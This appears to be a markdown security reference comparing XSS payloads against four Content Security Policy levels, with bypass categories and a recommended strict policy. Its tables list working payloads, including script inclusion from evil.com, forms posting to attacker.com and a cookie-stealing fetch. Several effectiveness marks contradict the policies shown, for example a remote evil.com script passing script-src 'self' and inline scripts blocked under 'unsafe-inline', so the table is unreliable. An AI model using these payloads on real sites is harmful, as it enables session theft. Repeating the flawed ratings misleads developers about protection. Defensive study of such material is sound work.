# XSS Payloads vs CSP Levels 

This document provides a comprehensive comparison of how different Content Security Policy (CSP) levels mitigate various XSS payloads across all three types of XSS vulnerabilities: Reflected, Stored, and DOM-based.

## CSP Levels Overview

Before examining the effectiveness tables, let's understand the different CSP levels:

1. **No CSP**: No Content Security Policy applied - offering no protection against XSS attacks.

2. **Basic CSP**:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src *;
   ```
   Allows inline scripts and styles but provides some basic restrictions.

3. **Moderate CSP**:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self';
   ```
   Blocks inline scripts but allows same-origin scripts.

4. **Strict CSP**:
   ```
   Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self'; connect-src 'self';
   ```
   Requires nonces for scripts and applies tight restrictions on all resource types.

## Effectiveness Tables

### Reflected XSS Payloads

| Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
|---------------|-----------------|--------|-----------|--------------|------------|
| Basic script tag | `<script>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
| Event handlers | `<img src="x" onerror="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | ✅ | ❌ | ❌ | ❌ |
| Data URI | `<object data="data:text/html,<script>alert('XSS')</script>">` | ✅ | ❌ | ❌ | ❌ |
| Inline SVG with script | `<svg onload="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
| CSS-based attack | `<div style="background-image: url('javascript:alert(1)')">` | ✅ | ✅ | ❌ | ❌ |
| Meta tag refresh | `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">` | ✅ | ❌ | ❌ | ❌ |
| Encoded JavaScript | `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E` | ✅ | ❌ | ❌ | ❌ |
| Filter bypass | `<scr<script>ipt>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | ✅ | ✅ | ✅ | ❌ |

### Stored XSS Payloads

| Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
|---------------|-----------------|--------|-----------|--------------|------------|
| Basic script tag | `<script>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
| Event handlers | `<img src="x" onerror="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
| Delayed execution | `<script>setTimeout(function(){alert('XSS')}, 2000)</script>` | ✅ | ❌ | ❌ | ❌ |
| Blind XSS for admin | `<img src="x" onerror="fetch('/log?stolen='+document.cookie)">` | ✅ | ✅ | ❌ | ❌ |
| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | ✅ | ❌ | ❌ | ❌ |
| HTML form injection | `<form action="https://attacker.com"><input name="stolen" value="data"></form>` | ✅ | ✅ | ✅ | ❌ |
| Auto-submitting form | `<form action="https://attacker.com" id="xss"><input name="cookie" value="data"></form><script>document.getElementById('xss').submit()</script>` | ✅ | ❌ | ❌ | ❌ |
| SVG animation | `<svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s"></animate></svg>` | ✅ | ✅ | ❌ | ❌ |
| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | ✅ | ✅ | ✅ | ❌ |
| DOM manipulation | `<div id="hack"></div><script>document.getElementById('hack').innerHTML='<img src=x onerror=alert(1)>'</script>` | ✅ | ❌ | ❌ | ❌ |

### DOM-based XSS Payloads

| Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
|---------------|-----------------|--------|-----------|--------------|------------|
| URL fragment injection | `#<img src=x onerror=alert('XSS')>` | ✅ | ✅ | ❌ | ❌ |
| Location manipulation | `javascript:alert('XSS')` | ✅ | ❌ | ❌ | ❌ |
| Script context breaking | `');alert('XSS');//` | ✅ | ✅ | ❌ | ❌ |
| innerHTML exploitation | `<img src=x onerror=alert('XSS')>` | ✅ | ✅ | ❌ | ❌ |
| eval() injection | `eval('alert("XSS")')` | ✅ | ✅ | ✅ | ❌ |
| setTimeout/setInterval | `setTimeout("alert('XSS')",100)` | ✅ | ✅ | ❌ | ❌ |
| document.write | `document.write('<script>alert("XSS")</script>')` | ✅ | ❌ | ❌ | ❌ |
| dangerouslySetInnerHTML | `<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert('XSS')>"}}></div>` | ✅ | ✅ | ❌ | ❌ |
| JSON.parse + eval | `JSON.parse('{"exec":"alert(1)"}').exec` | ✅ | ✅ | ✅ | ❌ |
| Event listeners | `element.addEventListener('load', ()=>alert('XSS'))` | ✅ | ✅ | ✅ | ❌ |

## Key Differences Between XSS Types

| Feature | Reflected XSS | Stored XSS | DOM-based XSS |
|---------|--------------|------------|---------------|
| Payload storage | Not stored; reflected from request | Stored in database/server | Exists in client-side JavaScript |
| Server involvement | Server reflects payload in response | Server stores and returns payload | Server may not process payload at all |
| Attack persistence | Temporary (single request) | Persistent (affects all visitors) | Depends on client-side execution |
| Typical vector | URL parameters, form inputs | Comments, profiles, messages | URL fragments, client-side data processing |
| Detection difficulty | Easiest to detect | Moderate to detect | Hardest to detect (may not appear in server logs) |
| Server-side filtering efficacy | High effectiveness | High effectiveness | Limited effectiveness |
| CSP effectiveness | Very effective | Very effective | Somewhat effective |
| Primary prevention | Input validation, output encoding | Input validation, output encoding | Safe DOM APIs, avoid innerHTML |

## CSP Bypass Techniques

While CSP provides strong protection against XSS, certain bypass techniques exist:

1. **Misconfigurations**:
   - Use of `unsafe-inline` in script-src
   - Use of unsafe domains in script-src
   - Overly permissive wildcard sources

2. **JSONP Endpoints**:
   - Can bypass CSP via callback parameters when same-origin scripts are allowed

3. **Angular.js Sandbox Escapes**:
   - Certain versions of Angular can bypass CSP when Angular templates are loaded

4. **DOM Clobbering**:
   - Manipulating DOM properties to trick JavaScript into executing unintended code

5. **Browser Bugs**:
   - Historical bugs in browser CSP implementations

## Recommended Secure Configuration

For maximum security, implement strict CSP with nonces and no unsafe directives:

```
Content-Security-Policy: 
    default-src 'none';
    script-src 'nonce-{random_nonce}' 'strict-dynamic';
    style-src 'self';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    frame-src 'self';
    form-action 'self';
    base-uri 'none';
    object-src 'none';
    frame-ancestors 'none';
    require-trusted-types-for 'script';
    upgrade-insecure-requests;
```

Additionally, always combine CSP with traditional defensive measures:
- Input validation
- Output encoding
- Safe APIs (avoiding innerHTML, document.write, eval)
- Framework security features